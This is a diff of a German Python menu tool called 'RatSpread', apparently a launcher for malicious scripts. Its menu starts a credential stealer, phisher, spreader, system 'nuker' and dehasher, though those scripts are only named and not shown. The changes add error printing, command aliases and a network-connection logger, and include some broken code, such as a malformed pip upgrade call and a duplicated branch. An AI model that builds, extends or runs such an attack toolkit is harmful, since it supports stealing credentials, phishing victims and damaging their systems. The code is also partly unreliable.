@@ -15,7 +15,7 @@ import random
 #False = Aus 
 #-------------------
 
-Version = "0.1.7"
+Version = "0.1.8"
 
 DEBUG_MODE = False #Eingabe: 99
 STREAMER_MODE = False #Eingabe: 100
@@ -39,10 +39,6 @@ Rat_encrypter = None
 Rat_setup = None
 Rat_phisher = None
 Rat_spreader = None
-Rat_nuker = None
-Rat_crawler = None
-Rat_dehasher = None
-Rat_save = None
 Rat_save_yt = None
 Rat_create = None 
 
@@ -128,13 +124,13 @@ def rat_pause():
 
 def rat_repeat(command_list, times):
     commands = command_list.split(", ")
-    
     for _ in range(times):
         for command in commands:
             eval(command)
 
 def rat_print(message):
     print(f"{main_color_theme}{message}")
+    sleep(0.003)
 
 def rat_print_wait(message, time):
     rat_print(f"{message}")
@@ -143,6 +139,10 @@ def rat_print_wait(message, time):
 def rat_print_pause(message):
     rat_print(f"{message}")
     rat_pause()
+
+def rat_print_error(message):
+    rat_print(f"{main_color_theme}{message}")
+    sleep(2)
 
 def clear():
     if not DEBUG_MODE:
@@ -335,6 +335,7 @@ def install_packages_if_needed(packages):
         except ImportError:
             debug(f" {package} wird nicht gefunden und wird jetzt installiert...")
             try:
+                subprocess.check_call([sys.executable, "python", "-m", "install", "--upgrade", "pip"])
                 subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                 debug(f" {package} wurde erfolgreich installiert.")
             except subprocess.CalledProcessError as e:
@@ -626,8 +627,7 @@ def RatStealer():
             error_menu(f"{bad} Fehler beim Ausführen des Stealer-Skripts: {e}")
     else:
         debug("Stealer-Skript nicht gefunden.")
-        rat_print("start_stealer_win.bat konnte nicht gefunden werden.")
-
+        rat_print_error("start_stealer_win.bat konnte nicht gefunden werden.")
 def RatNuker():
     if Rat_nuker:
         debug("Nuker-Skript wird ausgeführt")
@@ -637,7 +637,7 @@ def RatNuker():
             error_menu(f"{bad} Fehler beim Ausführen des Nuker-Skripts: {e}")
     else:
         debug("Nuker-Skript nicht gefunden.")
-        rat_print("RatSpreadSystemNuker.py konnte nicht gefunden werden.")
+        rat_print_error("RatSpreadSystemNuker.py konnte nicht gefunden werden.")
 
 def RatCrawler():
     if Rat_crawler:
@@ -660,7 +660,7 @@ def RatDehasher():
             error_menu(f"{bad} Fehler beim Ausführen des DeHasher-Skripts: {e}")
     else:
         debug("DeHasher-Skript nicht gefunden.")
-        rat_print("RatDeHasher.py konnte nicht gefunden werden.")
+        rat_print_error("RatDeHasher.py konnte nicht gefunden werden.")
 
 def verschluesselungs_menu():
     debug("Verschlüsselungsmenü aufgerufen")
@@ -690,10 +690,10 @@ def verschluesselungs_menu():
                 break
             else:
                 debug(f"Ungültige Option im Verschlüsselungsmenü ausgewählt: {option}")
-                rat_print('Ungültige Option. Bitte eine Zahl zwischen 1 und 3 eingeben.')
+                rat_print_error('Ungültige Option. Bitte eine Zahl zwischen 1 und 3 eingeben.')
         except ValueError:
             debug("Ungültige Eingabe im Verschlüsselungsmenü: keine Zahl")
-            rat_print('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
+            rat_print_error('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
         except Exception as e:
             error_menu(str(e))
 
@@ -706,7 +706,7 @@ def RatCrypter():
             error_menu(f"{bad} Fehler beim Ausführen des Verschlüsselungs-Skripts: {e}")
     else:
         debug("Verschlüsselungs-Skript nicht gefunden.")
-        rat_print("Ratcodierung.py konnte nicht gefunden werden.")
+        rat_print_error("Ratcodierung.py konnte nicht gefunden werden.")
 
 def RatEnCrypter():
     if Rat_encrypter:
@@ -717,7 +717,7 @@ def RatEnCrypter():
             error_menu(f"{bad} Fehler beim Ausführen des Entschlüsselungs-Skripts: {e}")
     else:
         debug("Entschlüsselungs-Skript nicht gefunden.")
-        rat_print("Ratuncode.py konnte nicht gefunden werden.")
+        rat_print_error("Ratuncode.py konnte nicht gefunden werden.")
 
 def RatSetup():
     if Rat_setup:
@@ -728,7 +728,7 @@ def RatSetup():
             error_menu(f"{bad} Fehler beim Ausführen des Setup-Skripts: {e}")
     else:
         debug("Setup-Skript nicht gefunden.")
-        rat_print("start_setup.py konnte nicht gefunden werden.")
+        rat_print_error("start_setup.py konnte nicht gefunden werden.")
 
 def RatPhisher():
     if Rat_phisher:
@@ -739,7 +739,7 @@ def RatPhisher():
             error_menu(f"{bad} Fehler beim Ausführen des Phisher-Skripts: {e}")
     else:
         debug("Phisher-Skript nicht gefunden.")
-        rat_print("RatPhisher.py konnte nicht gefunden werden.")
+        rat_print_error("RatPhisher.py konnte nicht gefunden werden.")
 
 def RatSave_menu():
     debug("RatSave aufgerufen")
@@ -770,10 +770,10 @@ def RatSave_menu():
                 break
             else:
                 debug(f"Ungültige Option im Verschlüsselungsmenü ausgewählt: {option}")
-                rat_print('Ungültige Option. Bitte eine Zahl zwischen 1 und 3 eingeben.')
+                rat_print_error('Ungültige Option. Bitte eine Zahl zwischen 1 und 3 eingeben.')
         except ValueError:
             debug("Ungültige Eingabe im Verschlüsselungsmenü: keine Zahl")
-            rat_print('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
+            rat_print_error('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
         except Exception as e:
             error_menu(str(e))
 def RatSave():
@@ -785,7 +785,7 @@ def RatSave():
             error_menu(f"{bad} Fehler beim Ausführen des RatSave-Skripts: {e}")
     else:
         debug("RatSave-Skript nicht gefunden.")
-        rat_print("RatSave.py konnte nicht gefunden werden.")
+        rat_print_error("RatSave.py konnte nicht gefunden werden.")
 
 def RatSave_yt():
     if Rat_save_yt:
@@ -796,7 +796,7 @@ def RatSave_yt():
             error_menu(f"{bad} Fehler beim Ausführen des RatSave-Skripts: {e}")
     else:
         debug("RatSave-Skript nicht gefunden.")
-        rat_print("RatSave_yt.py konnte nicht gefunden werden.")
+        rat_print_error("RatSave_yt.py konnte nicht gefunden werden.")
 
 def RatCreate():
     if Rat_create:
@@ -807,7 +807,7 @@ def RatCreate():
             error_menu(f"{bad} Fehler beim Ausführen des RatCreate-Skripts: {e}")
     else:
         debug("RatCreate-Skript nicht gefunden.")
-        rat_print("RatCreate.py konnte nicht gefunden werden.")
+        rat_print_error("RatCreate.py konnte nicht gefunden werden.")
 
 menu_options = {
     1: "Stealer starten",
@@ -848,7 +848,7 @@ def error_menu(error_message):
     rat_print(f"Ein {bad} Fehler ist aufgetreten:")
     rat_print(f"{error_message}")
     rat_print("\nDetaillierter Fehlerbericht:")
-    rat_print(error_report)
+    rat_print(error_report) 
 
     input("Drücke Enter, um fortzufahren...")
 
@@ -1096,7 +1096,7 @@ def info():
        {main_color_theme}Beschreibung:{end} Prüft die Verfügbarkeit einer Domain.
        {main_color_theme}Aufruf:{end} 'domain <domain_name>' (z. B. 'domain example.com')
 
-    {Secondary_color_theme}8. Domain anpingen:{end}
+    {Secondary_color_theme}8. Domain anpingen:{end} 
        {main_color_theme}Beschreibung:{end} Pingt eine Domain an, um deren Erreichbarkeit zu testen.
        {main_color_theme}Aufruf:{end} 'ping <domain_name>' (z. B. 'ping example.com')
 
@@ -1135,6 +1135,10 @@ def info():
        {main_color_theme}Beschreibung:{end} Schaltet den Lightmode an, dieser zeigt ein minimalistisches Overlay an
        {main_color_theme}Aufruf:{end} '300'
     {main_color_theme}----------------------------------------------------------------------
+    
+    {main_color_theme}By {Secondary_color_theme}Mausi Schmausi
+    
+    {main_color_theme}----------------------------------------------------------------------
     {end}"""
 
     rat_print_pause(menu)
@@ -1160,7 +1164,107 @@ def whois_lookup(domain):
         rat_print(f"Fehler: Konnte WHOIS-Informationen für {domain} nicht abrufen.")
         rat_print_wait(f"Grund: {str(e)}", 10)
 
+
+def conectioncheck():
+    import subprocess
+    import sys
+    import psutil
+    import subprocess
+    import time
+    import os
+    import socket
+    from datetime import datetime
+    required_packages = ["psutil"]
+
+    def install(package):
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+    for package in required_packages:
+        try:
+            __import__(package)
+        except ImportError:
+            install(package)
+
+    end = '\033[0m'
+    red = '\033[91m'
+    green = '\033[92m'
+    white = '\033[97m'
+    yellow = '\033[93m'
+
+    current_date = datetime.now().strftime("%Y-%m-%d")
+    log_file_path = f"Rat_network_log_{current_date}.txt"
+
+    def write_to_log(log_data):
+        try:
+            with open(log_file_path, "a") as log_file:
+                log_file.write(log_data + "\n")
+        except Exception as e:
+            print(f"{red}Fehler beim Schreiben in die Log-Datei: {e}{end}")
+
+    def ping_ip(ip):
+        try:
+            output = subprocess.check_output(['ping', '-n', '1', ip], stderr=subprocess.STDOUT, universal_newlines=True, encoding='cp850')
+            for line in output.splitlines():
+                if "Zeit=" in line:
+                    return int(line.split('Zeit=')[1].split()[0].replace("ms", ""))
+        except subprocess.CalledProcessError:
+            return None
+
+    def get_host_by_ip(ip):
+        try:
+            return socket.gethostbyaddr(ip)[0]
+        except socket.herror:
+            return "Unknown"
+
+    while True:
+        separator = "="*75
+        os.system('cls')
+        end_log_line = f"{separator}"
+        write_to_log(end_log_line)
+
+        header = f"{'IP Address':<20}{'Host':<30}{'Status':<15}{'Ping (ms)':<10}"
+        separator = "="*75
+        print(f"{white}{header}")
+        print(f"{white}{separator}")
+
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"\n--- {current_time} ---\n{header}\n{separator}"
+        write_to_log(log_entry)
+
+        connections = psutil.net_connections(kind='inet')
+
+        for conn in connections:
+            if conn.raddr:
+                ip = conn.raddr.ip
+                status = conn.status
+                ping = ping_ip(ip)
+                host = get_host_by_ip(ip)
+
+                if ping is None:
+                    ping_color = f"{red}N/A{end}"
+                    ping_log = "N/A"
+                elif ping > 150:
+                    ping_color = f"{red}{ping}ms{end}"
+                    ping_log = f"{ping}ms"
+                else:
+                    ping_color = f"{green}{ping}ms{end}"
+                    ping_log = f"{ping}ms"
+
+                if status in ["CLOSE_WAIT", "TIME_WAIT", "LAST_ACK"]:
+                    status_color = f"{red}{status:<15}{end}"
+                else:
+                    status_color = f"{yellow}{status:<15}{end}"
+
+                display_host = host if len(host) <= 25 else host[:25] + "..."
+                print(f"{white}{ip:<20}{display_host:<30}{status_color}{ping_color}")
+
+                log_line = f"{ip:<20}{host:<30}{status:<15}{ping_log}"
+                write_to_log(log_line)
+
+        time.sleep(1)
+
 def main_menu():
+    global contains
     script_status = initialize_scripts()
     while True:
         try:
@@ -1216,10 +1320,22 @@ def main_menu():
                 continue
 
             if option in ["rl", "reload"]:
+                force_clear()
                 Reload()
                 continue
 
-            if option == "clear":
+            if option in ["close", "exit", "bye"]:
+                stop_disco()
+                debug("Programm wird beendet")
+                rat_print_error(f'{main_color_theme}RatSpread wird beendet')
+                sys.exit(0)
+                continue
+
+            if option in ["cc", "concheck", "conectioncheck", "ccheck"]:
+                conectioncheck()
+                continue
+
+            if option in ["clear", "cls"]:
                 force_clear()
                 continue
 
@@ -1227,16 +1343,12 @@ def main_menu():
                 wko()
                 continue
 
-            if option == "test":
-                test()
-                continue
-
             if option.startswith("whois "):
                 domain = option[6:].strip()
                 if domain:
                     whois_lookup(domain)
                 else:
-                    rat_print("Keine gültige Domain eingegeben.")
+                    rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
             if option.startswith("domain "):
@@ -1244,7 +1356,7 @@ def main_menu():
                 if domain:
                     check_domain_availability(domain)
                 else:
-                    rat_print("Keine gültige Domain eingegeben.")
+                    rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
             if option.startswith("domaincheck "):
@@ -1252,7 +1364,23 @@ def main_menu():
                 if domain:
                     check_domain_availability(domain)
                 else:
-                    rat_print("Keine gültige Domain eingegeben.")
+                    rat_print_error("Keine gültige Domain eingegeben.")
+                continue
+
+            if option.startswith("dc "):
+                domain = option[3:].strip()
+                if domain:
+                    check_domain_availability(domain)
+                else:
+                    rat_print_error("Keine gültige Domain eingegeben.")
+                continue
+
+            if option.startswith("domaincheck "):
+                domain = option[12:].strip()
+                if domain:
+                    check_domain_availability(domain)
+                else:
+                    rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
             if option.startswith("domain_check "):
@@ -1260,7 +1388,7 @@ def main_menu():
                 if domain:
                     check_domain_availability(domain)
                 else:
-                    rat_print("Keine gültige Domain eingegeben.")
+                    rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
             if option.startswith("ping "):
@@ -1269,18 +1397,22 @@ def main_menu():
                 if IP:
                     pingdomain(IP)
                 else:
-                    rat_print("Keine gültige Domain eingegeben.")
+                    rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
             if option in ["debug", "debug on", "debug true", "debug off", "debug false"]:
                 debug_switch()
+                continue
+ 
+            if option.__contains__("test"):
+                test()
                 continue
 
             try:
                 option = int(option)
             except ValueError:
                 debug(f'"{option}" ist keine gültige Eingabe')
-                rat_print(f'{main_color_theme}Ungültige Eingabe. Bitte eine Zahl eingeben ...')
+                rat_print_error(f'{main_color_theme}Ungültige Eingabe.')
                 continue
 
             if option == 1:
@@ -1304,7 +1436,7 @@ def main_menu():
             elif option == 10:
                 stop_disco()
                 debug("Programm wird beendet")
-                rat_print(f'{main_color_theme}RatSpread wird beendet')
+                rat_print_error(f'{main_color_theme}RatSpread wird beendet')
                 sys.exit(0)
             elif option == 99:
                 debug_switch()
@@ -1318,11 +1450,11 @@ def main_menu():
                 lightmode_switch()
             else:
                 debug(f"Ungültige Option ausgewählt: {option}")
-                rat_print(f'{main_color_theme}Ungültige Option. Bitte eine Zahl zwischen 1 und 10 eingeben.')
+                rat_print_error(f'{main_color_theme}Ungültige Option. Bitte eine Zahl zwischen 1 und 10 eingeben.')
         except KeyboardInterrupt:
             if DEBUG_MODE is True:
                 stop_disco()
-                rat_print(" ")
+                rat_print_error(" ")
                 debug("Strg+C im Hauptmenü gedrückt, Script wird beendet")
                 sys.exit(0)
             else:
@@ -1334,3 +1466,4 @@ def main_menu():
 if __name__ == "__main__":
     disco_running = False
     main_menu()
+#By Mausi Schmausi
